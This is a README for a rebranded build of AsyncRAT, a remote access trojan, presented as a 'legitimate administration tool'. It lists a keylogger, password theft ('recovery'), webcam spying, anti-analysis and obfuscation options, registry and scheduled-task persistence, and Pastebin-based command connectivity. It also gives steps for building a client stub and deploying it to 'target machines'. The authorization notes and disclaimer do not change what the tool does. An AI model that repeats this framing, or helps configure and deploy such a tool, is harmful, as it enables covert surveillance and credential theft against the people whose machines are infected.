# HolyJesus_Blessings - Remote Administration Tool

## Overview

HolyJesus_Blessings is a custom-built remote administration tool designed for legitimate system administration and remote desktop management purposes. This client-server application enables authorized remote control and monitoring of Windows systems through a secure encrypted connection.

## Features

### Client (Stub)
- Persistent remote connection with automatic reconnection
- Custom icon integration
- Encrypted SSL/TLS communication
- System information gathering
- Remote desktop viewing and recording
- Comprehensive file management
- Process management and control
- Camera/webcam access
- Keylogger with recovery functionality
- Real-time chat system
- Plugin support architecture
- Dynamic DNS support
- Anti-analysis protection (configurable)

### Server (Builder)
- Custom client builder with configurable options
- Endpoint and port configuration
- SSL/TLS certificate support
- Multi-port receiver support
- Plugin management system
- Server thumbnail views
- Binary obfuscation options
- Client antivirus and integrity management
- SFTP access support
- Password recovery tools

## Requirements

- Windows 10/11
- .NET Framework 4.6+
- Visual C++ 2018-2020 Redistributable

## Installation

1. Install **Visual C++ 2018-2020 Redistributable** from the provided installer
2. Run `HolyJesus_Blessings.exe`
3. Configure your connection endpoint and port
4. Build the client stub using the builder
5. Deploy to authorized target machines

## Certificate Setup

The tool implements SSL/TLS encryption for secure communication:
- `ServerCertificate.p12` - Server SSL certificate for encrypted connections
- `BackupCertificate.zip` - Certificate backup for disaster recovery

## Plugins

The system uses a modular plugin architecture located in the `Plugins` directory:

| Plugin | Function |
|--------|----------|
| Chat.dll | Remote chat functionality |
| FileManager.dll | File operations and transfer |
| FileSearcher.dll | Advanced file searching |
| LimeLogger.dll | Keylogger with recovery |
| Miscellaneous.dll | Miscellaneous utilities |
| Options.dll | Client configuration options |
| ProcessManager.dll | Process monitoring and control |
| Recovery.dll | Data and password recovery |
| RemoteCamera.dll | Webcam capture and viewing |
| RemoteDesktop.dll | Desktop viewing and recording |
| SendFile.dll | File transfer operations |
| SendMemory.dll | Memory-based operations |
| Extra.dll | Additional extended features |

## Project Structure

```
COMPILED/
└── AsyncRAT/
    ├── HolyJesus_Blessings.exe    # Main application (Builder)
    ├── AsyncRAT.exe               # Server component
    ├── Stub.exe                   # Client stub
    ├── ServerCertificate.p12      # SSL certificate
    ├── BackupCertificate.zip      # Certificate backup
    ├── Fixer.bat                  # Utility script
    ├── IMG_20260417_032429 (1).ico # Custom application icon
    └── Plugins/                   # Plugin modules
        ├── Chat.dll
        ├── FileManager.dll
        ├── FileSearcher.dll
        ├── LimeLogger.dll
        ├── Miscellaneous.dll
        ├── Options.dll
        ├── ProcessManager.dll
        ├── Recovery.dll
        ├── RemoteCamera.dll
        ├── RemoteDesktop.dll
        ├── SendFile.dll
        ├── SendMemory.dll
        └── Extra.dll
```

## Technical Details

- **Language**: C# (.NET Framework)
- **Communication**: Asynchronous encrypted channels
- **Security**: SSL/TLS encryption with certificate-based authentication
- **Architecture**: Plugin-based modular design
- **Connection**: Multi-server and Dynamic DNS support

## Version

v0.5.8 - Custom Build (HolyJesus_Blessings)

## Security Notes

- Use only on systems you own or have explicit written authorization
- Configure firewall rules appropriately for allowed connections
- Use strong passwords for certificate protection
- Regularly update and rotate SSL certificates
- This tool is intended for legitimate administrative purposes only

## Build Configuration

The builder supports various configurable options:
- IP/hostname and port configuration
- Startup methods (Registry, Scheduled Task, Service)
- Antimalware startup options
- Anti-analysis protections
- JIT compilation settings
- Pastebin/DNS options for connectivity

---

**Disclaimer**: This tool is provided for educational and legitimate administrative purposes only. Unauthorized access to computer systems is illegal. The developer assumes no responsibility for any misuse of this software.